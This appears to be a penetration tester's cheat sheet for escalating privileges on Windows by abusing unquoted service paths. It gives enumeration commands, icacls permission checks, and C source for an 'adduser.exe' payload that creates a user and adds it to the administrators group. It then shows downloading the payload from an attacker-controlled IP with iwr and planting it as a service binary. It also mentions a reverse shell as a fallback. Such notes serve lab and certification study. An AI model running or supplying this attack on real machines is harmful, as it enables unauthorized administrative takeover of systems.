# UNQUOTED PATH
#enum 

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName

or better yet in cmd:
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```

#malicious_binary

```powershell
#compile: x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
#if non admin user may not have privs for this try revshell

#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user [user] [password] /add");
  i = system ("net localgroup administrators [user] /add");
  
  return 0;
}
```

#check_perms

```
Start-Service [service] / Stop-Service [service]
icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\Enterprise Apps"

	OUTPUT:BUILTIN\Users:(OI)(CI)(RX,W)
	
	we have write access so we can exploit
```

#exploit 
```
icacls "C:\Program Files\Enterprise Apps"

	OUTPUT:BUILTIN\Users:(OI)(CI)(RX,W)
	
	we have write access, so drop exe named Current.exe at C:\Program Files\Enterprise 
	Apps\Current.exe

iwr -uri http://[ip]/adduser.exe -Outfile Current.exe
or wget

Start-Service [service]
```